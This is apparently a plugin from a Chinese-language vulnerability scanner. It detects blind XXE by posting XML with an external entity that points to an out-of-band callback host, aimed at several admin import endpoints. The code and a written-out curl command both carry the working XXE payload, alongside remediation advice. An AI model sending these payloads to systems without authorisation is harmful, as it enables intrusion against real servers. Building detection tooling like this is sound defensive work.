# 盲 XXE（带外确认）— 向 XML 导入接口注入外部实体，回调即确认。
#
# 只覆盖常见的导入/XML 入口；没有回调一律 UNKNOWN。OAST 回调是唯一
# CONFIRMED 依据，避免把普通 400/500 误判成 XXE。
from common.models import SEVERITY_HIGH, STATUS_CONFIRMED, STATUS_UNKNOWN, ScanResult, UnknownReason
from core.http import join_url
from plugins.base import PluginBase


class BlindXxePlugin(PluginBase):
    """盲 XXE：外部实体被解析并发起回调时确认。"""

    name = "盲 XXE（带外确认）"
    cve = "N/A"
    severity = SEVERITY_HIGH
    category = "vuln"
    requires_oast = True
    cvss_vector = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
    compliance = "等保2.0:8.1.3;OWASP:A05:2021"
    description = "XML 解析器解析外部实体并访问 OAST 回调地址；带外确认盲 XXE"
    fix = "禁用 XML 外部实体（DTD/外部实体），或对 XML 输入做严格白名单校验"
    fix_detail = (
        "【Java】DocumentBuilderFactory 设置 disallow-doctype-decl=true，\n"
        "  或 XMLConstants.FEATURE_SECURE_PROCESSING=true，禁用外部实体\n"
        "【PHP】libxml_disable_entity_loader(true)（PHP<8）\n"
        "【合规】OWASP A05:2021 安全配置错误；等保 2.0 8.1.3"
    )

    reproduce = (
        "# 1) 生成回调 URL：python main.py -p http://target/ --oast --oast-host <本机可达IP>\n"
        "# 2) 向 XML 导入接口 POST 外部实体：\n"
        '#    curl -i -H "Content-Type: application/xml" --data \'<?xml version="1.0"?>\n'
        '#    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://<oast-host>:<http_port>/?id=<id>">]>\n'
        "#    <foo>&xxe;</foo>' http://target/system/user/importData\n"
        "# 预期响应：接口返回 200/500 均可，关键是 OAST 收到 HTTP 回调；\n"
        "# 无回调不能判不存在（解析器可能已禁用外部实体）"
    )

    _CANDIDATES = (
        "/system/user/importData",
        "/system/role/importData",
        "/system/dept/importData",
        "/monitor/job/import",
        "/tool/gen/importTable",
    )

    def verify(self, target, session) -> ScanResult:
        client = getattr(session, "oast_client", None)
        if client is None:
            return ScanResult(
                kind="vuln",
                name=self.name,
                severity=self.severity,
                status=STATUS_UNKNOWN,
                unknown_reason=UnknownReason.OAST_NO_CALLBACK.value,
                evidence="未启用 OAST，无法确认盲 XXE",
            )

        interactions = []
        probes = []
        try:
            for path in self._CANDIDATES:
                interaction = client.new_http_interaction()
                body = (
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "%s">]><foo>&xxe;</foo>' % interaction.url
                )
                url = join_url(target, path)
                probes.append(url)
                interactions.append((interaction, url))
                try:
                    session.post(
                        url,
                        data=body,
                        headers={"Content-Type": "application/xml", "Accept": "application/json"},
                        timeout=min(float(getattr(session, "timeout", 10) or 10), 5.0),
                    )
                except Exception:
                    continue

            hit = client.wait_any([item[0] for item in interactions])
            if hit is not None:
                callbacks = hit.callbacks()
                first = callbacks[0] if callbacks else {}
                return ScanResult(
                    kind="vuln",
                    name=self.name,
                    severity=self.severity,
                    status=STATUS_CONFIRMED,
                    url=next(url for item, url in interactions if item.interaction_id == hit.interaction_id),
                    evidence=(
                        "OAST 回调命中：外部实体被解析（来源 %s，方法 %s）"
                        % (first.get("from", "?"), first.get("method", "?"))
                    ),
                    extra={
                        "callback": {k: first.get(k) for k in ("protocol", "method", "from") if k in first},
                        "probes": len(probes),
                    },
                )
            return ScanResult(
                kind="vuln",
                name=self.name,
                severity=self.severity,
                status=STATUS_UNKNOWN,
                url=target,
                unknown_reason=UnknownReason.OAST_NO_CALLBACK.value,
                evidence="XXE payload 已注入 %d 个 XML 入口，但 OAST 未收到 HTTP 回调" % len(probes),
                extra={"probes": probes},
            )
        finally:
            for interaction, _url in interactions:
                try:
                    interaction.close()
                except Exception:
                    pass
